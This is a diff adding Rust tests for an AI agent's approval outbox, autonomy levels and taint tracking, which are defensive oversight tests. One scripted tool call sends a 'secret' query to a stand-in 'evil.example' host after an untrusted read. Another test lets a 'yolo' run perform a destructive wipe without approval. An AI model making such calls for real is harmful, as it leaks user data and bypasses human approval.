@@ -2583,3 +2583,366 @@ async fn sub_agents_and_routines_get_no_digest() {
     agent.drive(&run, CancellationToken::new()).await.unwrap();
     assert_eq!(h.kinds(&run), ["llm:completed"]);
 }
+
+// ---- the outbox and autonomy (T3, tooling spec §5.2, §5.4) ----
+
+/// The daemon's handler as far as the agent can tell: it can defer, and
+/// either nobody is there (`Unanswered`) or nobody answers (hangs).
+struct Nobody {
+    hang: bool,
+    asked: AtomicU32,
+    deferred: Mutex<Vec<i64>>,
+}
+
+impl Nobody {
+    fn new(hang: bool) -> Arc<Self> {
+        Arc::new(Self {
+            hang,
+            asked: AtomicU32::new(0),
+            deferred: Mutex::new(vec![]),
+        })
+    }
+}
+
+#[async_trait]
+impl ApprovalHandler for Nobody {
+    async fn ask(&self, _: &ApprovalRequest) -> Decision {
+        self.asked.fetch_add(1, Ordering::SeqCst);
+        if self.hang {
+            std::future::pending::<()>().await;
+        }
+        Decision::Unanswered
+    }
+    fn can_defer(&self) -> bool {
+        true
+    }
+    async fn deferred(&self, _: &ApprovalRequest, id: i64) {
+        self.deferred.lock().unwrap().push(id);
+    }
+}
+
+/// A write tool that isn't host-granted (`gmail_send`).
+fn sender() -> Arc<Counter> {
+    Arc::new(Counter::with_policy(
+        "send",
+        ToolPolicy::new(Effect::Write, false),
+    ))
+}
+
+fn agent_with(
+    h: &Harness,
+    script: Arc<Script>,
+    tools: Vec<Arc<dyn Tool>>,
+    approvals: Arc<dyn ApprovalHandler>,
+) -> Agent {
+    let mut reg = ToolRegistry::new();
+    for t in tools {
+        reg.register(t);
+    }
+    let p: Arc<dyn Provider> = script;
+    Agent::new(
+        Journal::new(h.store.clone()),
+        Arc::new(move |_| Ok(p.clone())),
+        Arc::new(reg),
+        approvals,
+        AgentConfig {
+            retry_base: Duration::from_millis(1),
+            approval_wait: Duration::from_millis(50),
+            ..AgentConfig::default()
+        },
+    )
+}
+
+/// Make the system run that executes an approved item, as the daemon does.
+fn approve(h: &Harness, id: i64, input: Option<&str>) -> String {
+    let exec = format!("exec{id}");
+    assert!(h.store.approve_outbox(id, &exec, input).unwrap());
+    let row = Journal::new(h.store.clone())
+        .to_row(&Message::user_text("[approved]"))
+        .unwrap();
+    h.store
+        .create_run(
+            &tern_store::NewRun {
+                id: &exec,
+                session_id: &h.session,
+                trigger: crate::outbox::TRIGGER,
+                model: "script:m",
+                system_prompt: "",
+                ..tern_store::NewRun::default()
+            },
+            &row,
+        )
+        .unwrap();
+    exec
+}
+
+#[tokio::test]
+async fn a_write_nobody_answers_goes_to_the_outbox_and_the_run_finishes() {
+    for hang in [false, true] {
+        let h = Harness::new();
+        let send = sender();
+        let nobody = Nobody::new(hang);
+        let script = Arc::new(Script::new(vec![
+            Reply::Tool("send", json!({ "to": "bob" })),
+            Reply::Text("Drafted it; it's waiting for you."),
+        ]));
+        let agent = agent_with(&h, script.clone(), vec![send.clone()], nobody.clone());
+        let run = h.start(&agent, "reply to bob");
+        let out = agent.drive(&run, CancellationToken::new()).await.unwrap();
+        assert_eq!(out.status, RunStatus::Completed, "hang={hang}");
+        assert_eq!(send.calls.load(Ordering::SeqCst), 0, "nothing sent");
+        assert_eq!(
+            h.kinds(&run),
+            ["llm:completed", "approval:completed", "llm:completed"]
+        );
+        let items = h.store.pending_outbox_for_run(&run).unwrap();
+        assert_eq!(items.len(), 1);
+        assert_eq!(
+            (items[0].tool.as_str(), items[0].effect.as_str()),
+            ("send", "write")
+        );
+        assert_eq!(items[0].input_json, json!({ "to": "bob" }).to_string());
+        assert_eq!(*nobody.deferred.lock().unwrap(), [items[0].id]);
+        let (said, is_error) = last_tool_result(&script.seen.lock().unwrap()[1]).unwrap();
+        assert!(
+            is_error
+                && said.starts_with(&format!("queued for approval as outbox #{}", items[0].id))
+        );
+
+        // Replay: the deferral is journaled, so nobody is asked again and
+        // no second item appears.
+        h.store.set_run_status(&run, "running", None).unwrap();
+        let again = agent.drive(&run, CancellationToken::new()).await.unwrap();
+        assert_eq!(again.final_text, out.final_text);
+        assert_eq!(nobody.asked.load(Ordering::SeqCst), 1);
+        assert_eq!(h.store.outbox(None, 10).unwrap().len(), 1);
+    }
+}
+
+#[tokio::test]
+async fn an_approved_item_runs_exactly_once_with_the_users_edit() {
+    let h = Harness::new();
+    let send = sender();
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("send", json!({ "to": "bob" })),
+        Reply::Text("queued"),
+    ]));
+    let agent = agent_with(&h, script, vec![send.clone()], Nobody::new(false));
+    let run = h.start(&agent, "reply to bob");
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    let id = h.store.pending_outbox_for_run(&run).unwrap()[0].id;
+
+    let exec = approve(&h, id, Some(r#"{"to":"carol"}"#));
+    let out = agent.drive(&exec, CancellationToken::new()).await.unwrap();
+    assert_eq!(out.status, RunStatus::Completed);
+    assert_eq!(send.calls.load(Ordering::SeqCst), 1);
+    assert_eq!(h.kinds(&exec), ["outbox_exec:completed"]);
+    let step = &h.store.steps(&exec).unwrap()[0];
+    assert!(step.input_json.contains("carol"), "{}", step.input_json);
+    let item = h.store.outbox_item(id).unwrap().unwrap();
+    assert_eq!(item.state, "done");
+    let r: ToolResult = serde_json::from_str(item.result_json.as_deref().unwrap()).unwrap();
+    assert_eq!(r.content, "count=1");
+    // The session learns it ran.
+    let last = h.store.session_messages(&h.session).unwrap();
+    assert!(
+        last.last()
+            .unwrap()
+            .text
+            .contains(&format!("[outbox #{id}: the user approved"))
+    );
+
+    // Driving the exec run again (a restart) replays; the call isn't repeated.
+    h.store.set_run_status(&exec, "running", None).unwrap();
+    agent.drive(&exec, CancellationToken::new()).await.unwrap();
+    assert_eq!(send.calls.load(Ordering::SeqCst), 1, "exactly once");
+}
+
+#[tokio::test]
+async fn a_crash_during_a_non_idempotent_outbox_call_is_not_repeated() {
+    let h = Harness::new();
+    let send = sender();
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("send", json!({})),
+        Reply::Text("q"),
+    ]));
+    let agent = agent_with(&h, script, vec![send.clone()], Nobody::new(false));
+    let run = h.start(&agent, "go");
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    let id = h.store.pending_outbox_for_run(&run).unwrap()[0].id;
+    let exec = approve(&h, id, None);
+    // The process died after marking the step started.
+    let call = ToolCall {
+        id: "call_0".into(),
+        name: "send".into(),
+        input: json!({}),
+    };
+    let input = json!({ "outbox_id": id, "call": call });
+    let hash = crate::journal::input_hash(StepKind::OutboxExec, &input).unwrap();
+    h.store
+        .start_step(&exec, 0, "outbox_exec", &hash, &input.to_string())
+        .unwrap();
+    agent.drive(&exec, CancellationToken::new()).await.unwrap();
+    assert_eq!(
+        send.calls.load(Ordering::SeqCst),
+        0,
+        "may have run: not repeated"
+    );
+    let item = h.store.outbox_item(id).unwrap().unwrap();
+    assert_eq!(item.state, "failed");
+}
+
+#[tokio::test]
+async fn a_rejected_or_decided_item_is_told_to_a_run_still_working() {
+    let h = Harness::new();
+    let run = h.start(
+        &h.agent(Arc::new(Script::new(vec![])), vec![], Arc::new(AutoApprove)),
+        "go",
+    );
+    let item = h
+        .store
+        .add_outbox(&tern_store::NewOutbox {
+            run_id: &run,
+            session_id: &h.session,
+            call_id: "c",
+            tool: "send",
+            input_json: "{}",
+            summary: "send hi",
+            effect: "write",
+            expires_at: i64::MAX,
+            ..tern_store::NewOutbox::default()
+        })
+        .unwrap();
+    h.store.reject_outbox(item.id, Some("not to Bob")).unwrap();
+    let item = h.store.outbox_item(item.id).unwrap().unwrap();
+    tell_outbox_run(&h.store, &item, None).unwrap();
+    tell_outbox_run(&h.store, &item, None).unwrap();
+    let mail = h.store.pending_mail(&run).unwrap();
+    assert_eq!(mail.len(), 1, "once per state");
+    let text = crate::subagent::render_mail(&mail[0]);
+    assert!(
+        text.starts_with(&format!("[outbox #{} was rejected: send hi]", item.id)),
+        "{text}"
+    );
+    assert!(text.contains("not to Bob"));
+}
+
+#[tokio::test]
+async fn autonomy_is_frozen_on_the_run_and_decides_what_asks() {
+    // readonly: the write is refused without asking, and the model is told.
+    let h = Harness::new();
+    let send = sender();
+    let asks = Arc::new(Recorder::default());
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("send", json!({})),
+        Reply::Text("ok"),
+    ]));
+    let agent = h.agent(script.clone(), vec![send.clone()], asks.clone());
+    let run = h.start(&agent, "go");
+    h.store.set_run_autonomy(&run, "readonly").unwrap();
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    assert!(asks.0.lock().unwrap().is_empty());
+    assert_eq!(send.calls.load(Ordering::SeqCst), 0);
+    let (said, _) = last_tool_result(&script.seen.lock().unwrap()[1]).unwrap();
+    assert!(said.contains("read-only"), "{said}");
+
+    // autonomous: an untainted write doesn't ask, with no approval step.
+    let h = Harness::new();
+    let send = sender();
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("send", json!({})),
+        Reply::Text("ok"),
+    ]));
+    let agent = h.agent(script, vec![send.clone()], Arc::new(AutoDeny));
+    let run = h.start(&agent, "go");
+    h.store.set_run_autonomy(&run, "autonomous").unwrap();
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    assert_eq!(send.calls.load(Ordering::SeqCst), 1);
+    assert_eq!(
+        h.kinds(&run),
+        ["llm:completed", "tool:completed", "llm:completed"]
+    );
+
+    // yolo: even a tainted run's destructive call runs without asking.
+    let h = Harness::new();
+    let wipe = Arc::new(Counter::with_policy(
+        "wipe",
+        ToolPolicy::new(Effect::Destructive, false),
+    ));
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("inbox", json!({})),
+        Reply::Tool("wipe", json!({})),
+        Reply::Text("ok"),
+    ]));
+    let agent = h.agent(
+        script,
+        vec![Arc::new(Inbox), wipe.clone()],
+        Arc::new(AutoDeny),
+    );
+    let run = h.start(&agent, "go");
+    h.store.set_run_autonomy(&run, "yolo").unwrap();
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    assert_eq!(wipe.calls.load(Ordering::SeqCst), 1);
+    assert!(h.store.run(&run).unwrap().unwrap().taint.is_some());
+}
+
+/// A network read: `fetch` with a `host`, untrusted like `http_fetch`.
+struct Fetch(AtomicU32);
+
+#[async_trait]
+impl Tool for Fetch {
+    fn spec(&self) -> ToolSpec {
+        ToolSpec {
+            name: "fetch".into(),
+            description: "fetch".into(),
+            input_schema: json!({"type": "object"}),
+        }
+    }
+    fn effect(&self) -> Effect {
+        Effect::Read
+    }
+    fn untrusted(&self) -> bool {
+        true
+    }
+    fn egress_host(&self, args: &Value) -> Option<String> {
+        args["host"].as_str().map(Into::into)
+    }
+    fn policy(&self, _: &ToolCtx, _: &Value) -> ToolPolicy {
+        ToolPolicy::new(Effect::Read, true)
+    }
+    async fn call(&self, _: &ToolCtx, _: Value) -> ToolResult {
+        self.0.fetch_add(1, Ordering::SeqCst);
+        ToolResult::ok("page")
+    }
+}
+
+#[tokio::test]
+async fn a_tainted_run_asks_before_reaching_a_new_host() {
+    let h = Harness::new();
+    let fetch = Arc::new(Fetch(AtomicU32::new(0)));
+    let asks = Arc::new(Recorder::default());
+    let script = Arc::new(Script::new(vec![
+        Reply::Tool("fetch", json!({ "host": "news.example" })),
+        Reply::Tool("fetch", json!({ "host": "news.example", "page": 2 })),
+        Reply::Tool("fetch", json!({ "host": "evil.example", "q": "secret" })),
+        Reply::Text("done"),
+    ]));
+    let agent = h.agent(script, vec![fetch.clone()], asks.clone());
+    let run = h.start(&agent, "read the news");
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    // The first read tainted the run; the same host again is fine; a new
+    // one asks, without "always".
+    let asked = asks.0.lock().unwrap().clone();
+    assert_eq!(asked.len(), 1);
+    assert!(asked[0].call.input["host"] == "evil.example" && asked[0].pattern.is_none());
+    assert_eq!(asked[0].effect, Effect::Read);
+    assert_eq!(fetch.0.load(Ordering::SeqCst), 3, "the recorder allowed it");
+    assert_eq!(h.store.allowlist("fetch").unwrap(), Vec::<String>::new());
+
+    // Replay rebuilds the hosts: the same steps, nobody asked again.
+    let before = h.kinds(&run);
+    h.store.set_run_status(&run, "running", None).unwrap();
+    agent.drive(&run, CancellationToken::new()).await.unwrap();
+    assert_eq!(h.kinds(&run), before);
+    assert_eq!(asks.0.lock().unwrap().len(), 1);
+}
